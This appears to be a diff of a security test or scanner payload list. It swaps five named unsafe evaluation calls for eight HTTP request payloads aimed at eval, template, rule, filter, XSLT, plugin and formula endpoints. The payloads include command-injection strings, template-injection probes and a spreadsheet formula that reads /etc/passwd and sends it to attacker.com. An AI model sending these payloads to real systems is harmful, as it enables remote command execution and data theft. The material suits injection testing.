@@ -1,5 +1,8 @@
-eval(JSON.parse(userInput))
-new Function(userInput)()
-vm.runInNewContext(userCode)
-exec(compile(user_code, '<string>', 'exec'))
-require('vm').Script(userInput).runInThisContext()
+POST /api/eval {"code":"process.exit()"}
+POST /api/exec {"script":"os.system('id')"}
+PUT /api/rule {"condition":"__import__('os').system('id')"}
+POST /api/template {"src":"{{system('id')}}"}
+POST /api/filter {"expr":"${7*7}"}
+POST /api/transform {"xslt":"<xsl:value-of select="system-property('xsl:version')"/>"}
+PUT /api/plugin {"code":"require('child_process').execSync('id')"}
+POST /api/compute {"formula":"=IMPORTXML(CONCAT("http://attacker.com/?",IMPORTXML("file:///etc/passwd","//*")),"//*")"}
